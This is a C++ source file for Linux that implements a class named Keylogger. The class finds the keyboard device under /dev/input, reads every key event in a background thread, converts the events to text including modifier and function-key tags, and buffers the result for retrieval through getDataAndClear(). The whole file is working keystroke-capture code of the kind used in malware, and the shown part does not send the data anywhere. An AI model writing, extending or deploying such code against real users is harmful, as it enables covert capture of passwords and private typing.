#include "KeyboardController.h"
#ifdef __linux__

std::vector<string> Keylogger::_buffer;
std::mutex Keylogger::_mtx;

Keylogger::Keylogger() : _isRunning(false), _fd(-1) {}

Keylogger::~Keylogger() {
    Stop();
}

void Keylogger::append(const std::string& str) {
    std::lock_guard<std::mutex> lock(_mtx);
    _buffer.push_back(str);
}

std::string findKeyboardDevice() {
    const char* dirname = "/dev/input/";
    DIR* dir = opendir(dirname);
    if (!dir) return "";

    struct dirent* entry;
    char path[512];

    while ((entry = readdir(dir)) != nullptr) {
        if (strncmp(entry->d_name, "event", 5) == 0) {
            snprintf(path, sizeof(path), "%s%s", dirname, entry->d_name);
            int fd = open(path, O_RDONLY);
            if (fd >= 0) {
                unsigned long key_bitmask[256 / (sizeof(unsigned long) * 8)];
                memset(key_bitmask, 0, sizeof(key_bitmask));

                ioctl(fd, EVIOCGBIT(0, sizeof(key_bitmask)), key_bitmask);
                if (key_bitmask[0] & (1 << EV_KEY)) {
                    unsigned long keys[KEY_MAX / (sizeof(unsigned long) * 8)];
                    memset(keys, 0, sizeof(keys));
                    ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keys)), keys);
                    if (keys[KEY_Q / (sizeof(unsigned long) * 8)] & (1UL << (KEY_Q % (sizeof(unsigned long) * 8)))) {
                        close(fd);
                        closedir(dir);
                        return std::string(path);
                    }
                }
                close(fd);
            }
        }
    }
    closedir(dir);
    return "";
}

void Keylogger::LinuxLoop() {
    std::string devPath = findKeyboardDevice();

    if (devPath.empty()) {
        std::cerr << "[KEY_LINUX] Keyboard not founded!.\n";
        _isRunning = false;
    }

    _fd = open(devPath.c_str(), O_RDONLY);

    if (_fd == -1) {
        std::cerr << "[KEY_LINUX] Can't open " << devPath << ". Please run with sudo.\n";
        _isRunning = false;
        return;
    }

    std::cout << "[KEY_LINUX] Keylogger from : " << devPath << std::endl;

    struct input_event ev;
    bool isShift = false;
    bool isCapsLock = false;

    const char* shift_numbers = ")!@#$%^&*(";

    while(_isRunning) {
        ssize_t n = read(_fd, &ev, sizeof(ev));
        if (n < (ssize_t)sizeof(ev)) {
            if (n == -1 && errno == EINTR) continue;
            break;
        }

        if (ev.type == EV_KEY) {
            if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                isShift = (ev.value != 0);
                if (ev.value == 1) {
                    if (ev.code == KEY_LEFTSHIFT) append("[L-SHIFT]");
                    else append("[R-SHIFT]");
                }
                continue;
            }

            if (ev.code == KEY_CAPSLOCK && ev.value == 1) {
                isCapsLock = !isCapsLock;
                append("[CAPS]");
                continue;
            }

            if (ev.value == 1 || ev.value == 2) {
                std::string key = "";

                if ((ev.code >= KEY_Q && ev.code <= KEY_P) || 
                    (ev.code >= KEY_A && ev.code <= KEY_L) || 
                    (ev.code >= KEY_Z && ev.code <= KEY_M)) {
                    
                    switch(ev.code) {
                        case KEY_Q: key="q"; break; case KEY_W: key="w"; break; case KEY_E: key="e"; break;
                        case KEY_R: key="r"; break; case KEY_T: key="t"; break; case KEY_Y: key="y"; break;
                        case KEY_U: key="u"; break; case KEY_I: key="i"; break; case KEY_O: key="o"; break;
                        case KEY_P: key="p"; break; case KEY_A: key="a"; break; case KEY_S: key="s"; break;
                        case KEY_D: key="d"; break; case KEY_F: key="f"; break; case KEY_G: key="g"; break;
                        case KEY_H: key="h"; break; case KEY_J: key="j"; break; case KEY_K: key="k"; break;
                        case KEY_L: key="l"; break; case KEY_Z: key="z"; break; case KEY_X: key="x"; break;
                        case KEY_C: key="c"; break; case KEY_V: key="v"; break; case KEY_B: key="b"; break;
                        case KEY_N: key="n"; break; case KEY_M: key="m"; break;
                    }
                    if (!key.empty() && (isShift ^ isCapsLock)) {
                        key[0] = std::toupper(key[0]);
                    }
                }
                else if (ev.code >= KEY_1 && ev.code <= KEY_0) {
                    int num = (ev.code == KEY_0) ? 0 : (ev.code - KEY_1 + 1);
                    if (isShift) key = std::string(1, shift_numbers[num % 10]);
                    else key = std::to_string(num % 10);
                }
               else {
                    switch (ev.code) {
                        case KEY_ENTER:     key = "[RETURN]"; break;
                        case KEY_BACKSPACE: key = "[DELETE]"; break;
                        case KEY_SPACE:     key = " "; break;
                        case KEY_TAB:       key = "[TAB]"; break;
                        case KEY_ESC:       key = "[ESC]"; break;
                        case KEY_UP:        key = "[UP]"; break;
                        case KEY_DOWN:      key = "[DOWN]"; break;
                        case KEY_LEFT:      key = "[LEFT]"; break;
                        case KEY_RIGHT:     key = "[RIGHT]"; break;
                        case KEY_LEFTCTRL:  key = "[L-CTRL]"; break;
                        case KEY_RIGHTCTRL: key = "[R-CTRL]"; break;
                        case KEY_LEFTALT:  key = "[L-ALT]"; break;
                        case KEY_RIGHTALT:  key = "[R-ALT]"; break;
                        case KEY_LEFTMETA: key = "[L-CMD]"; break;
                        case KEY_RIGHTMETA: key = "[R-CMD]"; break;
                        
                        case KEY_F1: key="[F1]"; break; case KEY_F2: key="[F2]"; break;
                        case KEY_F3: key="[F3]"; break; case KEY_F4: key="[F4]"; break;
                        case KEY_F5: key="[F5]"; break; case KEY_F6: key="[F6]"; break;
                        case KEY_F7: key="[F7]"; break; case KEY_F8: key="[F8]"; break;
                        case KEY_F9: key="[F9]"; break; case KEY_F10: key="[F10]"; break;
                        case KEY_F11: key="[F11]"; break; case KEY_F12: key="[F12]"; break;

                        case KEY_MINUS:     key = isShift ? "_" : "-"; break;
                        case KEY_EQUAL:     key = isShift ? "+" : "="; break;
                        case KEY_SEMICOLON: key = isShift ? ":" : ";"; break;
                        case KEY_APOSTROPHE:key = isShift ? "\"" : "'"; break;
                        case KEY_GRAVE:     key = isShift ? "~" : "`"; break;
                        case KEY_COMMA:     key = isShift ? "<" : ","; break;
                        case KEY_DOT:       key = isShift ? ">" : "."; break;
                        case KEY_SLASH:     key = isShift ? "?" : "/"; break;
                        case KEY_BACKSLASH: key = isShift ? "|" : "\\"; break;
                        case KEY_LEFTBRACE: key = isShift ? "{" : "["; break;
                        case KEY_RIGHTBRACE:key = isShift ? "}" : "]"; break;
                    }
                }
                if (!key.empty()) append(key);
            }
        }
    }
    close (_fd);
    _fd = -1;
}

void Keylogger::Start() {
    if (_isRunning) return;
    _isRunning = true;

    _workerThread = std::thread([this]() {
        this->LinuxLoop();
    });
}

void Keylogger::Stop() {
    if (!_isRunning) return;
    _isRunning = false;

    if (_fd != -1) {
        close(_fd);
        _fd = -1;
    }

    if (_workerThread.joinable()) {
        _workerThread.join();
    }
}

std::vector<std::string> Keylogger::getDataAndClear() {
    std::lock_guard<std::mutex> lock(_mtx);
    if (_buffer.empty()) return {};
    std::vector<std::string> copy = std::move(_buffer);
    _buffer.clear();
    return copy;
}

#endif
